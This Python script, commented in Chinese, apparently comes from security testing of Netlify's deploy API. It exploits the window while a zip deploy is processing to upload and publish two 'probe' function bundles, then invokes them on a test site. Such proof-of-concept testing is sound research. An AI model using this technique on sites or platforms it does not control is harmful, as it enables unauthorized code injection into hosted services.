# -*- coding: utf-8 -*-
"""Netlify:zip 含 netlify.toml 触发构建流程(长 uploaded 窗口)后 PUT 函数 bundle"""
import http.client, ssl, gzip, brotli, sys, json, zipfile, io, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import TOKEN_A, SITE_A

ctx = ssl.create_default_context()

def api(path, method='GET', body=None, raw_body=None, ctype='application/json', qs=''):
    conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=60)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept-Encoding': 'br, gzip', 'Accept': 'application/json',
         'Authorization': 'Bearer ' + TOKEN_A, 'Content-Type': ctype}
    payload = raw_body if raw_body is not None else (json.dumps(body).encode() if body is not None else None)
    conn.request(method, path + qs, body=payload, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw

probe1_src = open(r'D:\scan\netlify_report\fn_functions\probe1\index.js', encoding='utf-8').read()
probe2_src = open(r'D:\scan\netlify_report\_fn_probe2.js', encoding='utf-8').read()

# netlify.toml 最小配置
TOML = '[build]\n  publish = "."\n'

def state_of(did):
    s, raw = api('/api/v1/sites/%s/deploys/%s' % (SITE_A, did))
    if s != 200:
        return None
    return json.loads(raw).get('state')

def try_put(did, name, src):
    zbuf = io.BytesIO()
    with zipfile.ZipFile(zbuf, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr('index.js', src)
    fzip = zbuf.getvalue()
    return api('/api/v1/deploys/%s/functions/%s' % (did, name), method='PUT', raw_body=fzip,
               ctype='application/zip', qs='?runtime=js&size=%d' % len(fzip))

# 1. zip 创建:index.html + netlify.toml
site_buf = io.BytesIO()
with zipfile.ZipFile(site_buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr('index.html', '<html><body>fn recover</body></html>')
    z.writestr('netlify.toml', TOML)
site_zip = site_buf.getvalue()
s, raw = api('/api/v1/sites/%s/deploys' % SITE_A, method='POST', raw_body=site_zip, ctype='application/zip')
d = json.loads(raw)
DID = d.get('id')
print('create:', s, 'DID:', DID, 'state:', d.get('state'), 'build_id:', d.get('build_id'))

# 2. 轮询状态,uploaded/processing 时 PUT 函数(probe1+probe2)
last = None
done = set()
for i in range(90):
    st = state_of(DID)
    if st != last:
        print('t+%ds state=%s' % (i, st))
        last = st
    if st in ('uploaded', 'uploading', 'processing', 'building', 'enqueued'):
        for name, src in [('probe1', probe1_src), ('probe2', probe2_src)]:
            if name in done:
                continue
            s2, raw2 = try_put(DID, name, src)
            print('  PUT %s @%s: %d %s' % (name, st, s2, raw2[:160].decode('utf-8', 'ignore').replace('\n', ' ')))
            if s2 == 200:
                done.add(name)
    if st in ('ready', 'error') and i > 5:
        break
    time.sleep(1)

print('PUT done:', done)
# 3. 发布
if done:
    s, raw = api('/api/v1/sites/%s/deploys/%s' % (SITE_A, DID), method='PUT', body={'state': 'published'})
    dd = json.loads(raw) if s == 200 else {}
    print('publish:', s, dd.get('state'))
    time.sleep(3)
    for name in done:
        try:
            conn = http.client.HTTPSConnection('sec-test-rcf6lz.netlify.app', context=ctx, timeout=60)
            conn.request('GET', '/.netlify/functions/%s' % name)
            r = conn.getresponse()
            b = r.read()
            print('invoke', name, ':', r.status, 'len', len(b))
            if name == 'probe1':
                print(b[:800].decode('utf-8', 'ignore'))
            conn.close()
        except Exception as e:
            print('invoke', name, 'err:', str(e)[:120])
else:
    print('no fn uploaded; deploy state:', state_of(DID))
